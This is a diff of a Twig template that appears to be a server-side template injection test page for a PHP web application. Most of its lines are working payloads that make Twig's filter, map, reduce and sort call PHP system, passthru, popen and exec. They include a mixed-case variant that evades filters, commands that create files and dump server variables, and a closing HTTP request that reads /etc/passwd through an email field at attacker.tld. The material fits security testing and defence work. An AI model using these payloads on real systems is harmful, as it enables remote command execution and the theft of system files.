@@ -1,41 +1,51 @@
-{% spaceless %}
-    <div>
-        {{ 'UI:Login:UserNamePrompt'|dict_s }}
-    </div>
-    <div>
-        ['id']|filter('system')
-    </div>
-    {{ ['id']|filter('system') }}
-    <div>
-        ['touch+/tmp/test+']|filter('system')|join(',')
-    </div>
-    {{ ['touch+/tmp/test+']|filter('system')|join(',') }}
-    <div>
-        set sizes = [34, 36, 38, 40, 42]
-        sizes|filter(v => v > 38)|join(', ')
-    </div>
-    {% set sizes = [34, 36, 38, 40, 42] %}
-    {{ sizes|filter(v => v > 38)|join(', ') }}
-    <div>
-        app.request.server.all|join(',')
-    </div>
-    {{ app.request.server.all|join(',') }} {# needs syfony #}
-    <div>
-        self
-    </div>
-    {{ self }} {# ??? not sure #}
-    <div>
-        [0]|reduce('system','echo')
-    </div>
-    {{ [0]|reduce('system','echo') }}
-    <div>
-        ['echo']|map('system')|join
-    </div>
-    {{ ['echo']|map('system')|join }}
-    <div>
-        ['echo',1]|sort('system')|join
-    </div>
-    {{ ['echo',1]|sort('system')|join }}
-    POST /subscribe?0=cat+/etc/passwd HTTP/1.1
-    email="{{ app.request.query.filter(0,0,1024,{'options':'system'}) }}"@attacker.tld
-{% endspaceless %}
+<div>{{ 'UI:Login:UserNamePrompt'|dict_s }}</div>
+
+<div>['id']|filter('system')|join</div>
+{{ ['id']|filter('system')|join }}
+
+<div>['echo']|filter('passthru')|join</div>
+{{ ['echo']|filter('passthru')|join }}
+
+<div>['echo']|filter('popen')|join</div>
+{{ ['echo']|filter('popen')|join }}
+
+<div>['echo']|filter('exec')|join</div>
+{{ ['echo']|filter('exec')|join }}
+
+<div>['id']|filter('SysteM')|join</div>
+{{ ['id']|filter('SysteM')|join }}
+
+<div>['touch+/tmp/test+']|filter('system')|join(',')</div>
+{{ ['touch+/tmp/test+']|filter('system')|join(',') }}
+
+<div>[34, 36, 38, 40, 42]|filter(v => v > 38)|join(', ')</div>
+{{ [34, 36, 38, 40, 42]|filter(v => v > 38)|join(', ') }}
+
+<div>app.request.server.all|join(',')</div>
+{{ app.request.server.all|join(',')}}
+
+<div>self</div>
+{{ self }}
+
+<div>[0]|reduce('system','echo')</div>
+{{ [0]|reduce('system','echo') }}
+
+<div>[1, 2, 3]|reduce((carry, v) => carry + v)</div>
+{% set numbers = [1, 2, 3] %}
+{{ numbers|reduce((carry, v) => carry + v) }}
+
+<div>['echo']|map('system')|join</div>
+{{ ['echo']|map('system')|join }}
+
+<div>{"Bob": "Smith", "Alice": "Dupond"}|map((value, key) => "#{key} #{value}")|join(', ')</div>
+{% set people = {
+"Bob": "Smith",
+"Alice": "Dupond",
+} %}
+{{ people|map((value, key) => "#{key} #{value}")|join(', ') }}
+
+<div>['echo',1]|sort('system')|join</div>
+{{ ['echo',1]|sort('system')|join }}
+
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{ app.request.query.filter(0,0,1024,{'options':'system'}) }}"@attacker.tld
